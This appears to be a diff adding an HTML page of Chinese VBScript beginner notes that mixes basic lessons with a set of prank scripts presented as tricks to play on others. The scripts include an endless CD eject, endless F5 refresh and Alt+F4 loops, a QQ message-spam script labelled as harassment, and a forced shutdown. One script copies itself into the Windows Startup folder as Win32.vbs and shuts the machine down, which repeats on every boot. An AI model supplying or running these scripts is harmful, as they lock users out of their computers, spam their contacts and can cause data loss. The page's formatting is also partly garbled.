@@ -1,0 +1,194 @@
+<h1>入门知识</h1>
+
+<h3>定义常量（不变的量）</h3>
+
+<p><code>
+const hw=&quot;Hello World&quot; 
+msgbox(hw) 
+msgbox(hw) 
+msgbox(hw) 
+msgbox(hw) 
+msgbox(hw) 
+</code></p>
+
+<h3>定义变量（可以后来改变的量）</h3>
+
+<p><code>
+Dim a1,a2,a3 
+a1=14 
+a2=12.23 
+a3=&quot;Hello&quot;
+</code>
+<em>(&gt;_&lt;)正确打开方式
+<code>
+dim a,b,s 
+a=inputbox(&quot;请输入矩形的长:&quot;) 
+b=inputbox(&quot;请输入矩形的宽:&quot;) 
+s=a*b 
+msgbox(s)
+</code>
++,-,</em>,/,(),[],{}都是一样的用法
+<code>
+Dim name,msg 
+msg=&quot;请输入你的名字:&quot;
+name=Inputbox(msg) 
+msg=&quot;请输入父亲的名字&quot;
+name1=Inputbox(msg)
+msg=&quot;请输入母亲的名字&quot;
+name2=Inputbox(msg)
+Msgbox(name) +&quot;好&quot;
+Msgbox(name1)+&quot;也好&quot;
+Msgbox(name2)+&quot;也好啊&quot;
+</code>
+(1+2)=12
+改：c=(int(a)+int(b))
+或：a=CDbl(inpu……)</p>
+
+<hr/>
+
+<p><code></code>
+set wmp=createobject(&quot;wmplayer.ocx&quot;) </p>
+
+<p>set cd=wmp.cdromcollection.item(0) </p>
+
+<p>do </p>
+
+<p>cd.eject </p>
+
+<p>loop 
+<code></code>`</p>
+
+<hr/>
+
+<p>&lt;h2&gt;无尽语音报数：&lt;/h2&gt;</p>
+
+<p>无限语音从1数到无限大。</p>
+
+<hr/>
+
+<p><code></code>
+Set s = CreateObject(&quot;sapi.spvoice&quot;) </p>
+
+<p>i=0 </p>
+
+<p>do </p>
+
+<p>s.speak i </p>
+
+<p>i=i+1 </p>
+
+<p>loop 
+<code></code>`</p>
+
+<hr/>
+
+<p>&lt;h2&gt;无尽刷新：&lt;/h2&gt;</p>
+
+<p>慎用，如此刷新打开任务管理器都难，只能拔掉电源。</p>
+
+<hr/>
+
+<p>set ws=createobject(&quot;wscript.shell&quot;) </p>
+
+<p>do </p>
+
+<p>ws.sendkeys &quot;{f5}&quot; </p>
+
+<p>loop </p>
+
+<hr/>
+
+<p>&lt;h2&gt;修改注册表：&lt;/h2&gt;</p>
+
+<hr/>
+
+<p><code></code>
+on error resume next </p>
+
+<p>set wr=createobject(&quot;scripting.filesystemobject&quot;) </p>
+
+<p>set ws=createobject(&quot;wscript.shell&quot;) </p>
+
+<p>set f = wr.getfile(wscript.scriptfullname) </p>
+
+<p>q=ws.regread(&quot;HKEY<em>CURRENT</em>USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Startup&quot;) </p>
+
+<p>if not f=&quot;Win32.vbs&quot; then wr.copyfile f,q&amp;&quot;\Win32.vbs&quot;,true </p>
+
+<p>ws.run&quot;shutdown -p&quot;,vbhide
+<code></code>`</p>
+
+<hr/>
+
+<p>&lt;h2&gt;信息骚扰恶搞：&lt;/h2&gt;</p>
+
+<p>打开好友的聊天对话框，代码中的“10”代表发送次数，把10修改一下就可以自定义发送QQ信息到好友的次数。把发送的内容“复制”即可，当打开本vbs的时候就会把剪切板里的内容粘贴发送过去。</p>
+
+<hr/>
+
+<p><code></code>
+On Error Resume Next </p>
+
+<p>Dim wsh,ye </p>
+
+<p>set wsh=createobject(&quot;wscript.shell&quot;) </p>
+
+<p>for i=1 to 10 </p>
+
+<p>wscript.sleep 700 </p>
+
+<p>wsh.AppActivate</p>
+
+<p>wsh.sendKeys &quot;^v&quot; </p>
+
+<p>wsh.sendKeys i </p>
+
+<p>wsh.sendKeys &quot;%s&quot; </p>
+
+<p>next </p>
+
+<p>wscript.quit
+<code></code>`</p>
+
+<hr/>
+
+<p>&lt;h2&gt;直接关机：&lt;/h2&gt;</p>
+
+<hr/>
+
+<p><code></code>
+dim WSHshell </p>
+
+<p>set WSHshell = wscript.createobject(&quot;wscript.shell&quot;) </p>
+
+<p>WSHshell.run &quot;shutdown -f -s -t 00&quot;,0 ,true
+<code></code>`</p>
+
+<hr/>
+
+<p>&lt;h2&gt;不断按下alt+f4 ：&lt;/h2&gt;</p>
+
+<p>打开任何程序都关掉</p>
+
+<hr/>
+
+<p><code></code>
+dim WSHshell </p>
+
+<p>set WSHshell = wscript.createobject(&quot;wscript.shell&quot;) </p>
+
+<p>do</p>
+
+<p>wscript.sleep 2500 </p>
+
+<p>WSHshell.SendKeys &quot;%{F4}&quot; </p>
+
+<p>loop 
+<code></code>`</p>
+
+<hr/>
+
+<p>12
+“逻辑与”相当于生活中说的“并且”，就是两个条件都同时成立的情况下“逻辑与”的运算结果才为“真”。
+“逻辑或”相当于生活中的“或者”，当两个条件中有任一个条件满足，“逻辑或”的运算结果就为“真”
+”逻辑非“就是指本来值的反。</p>
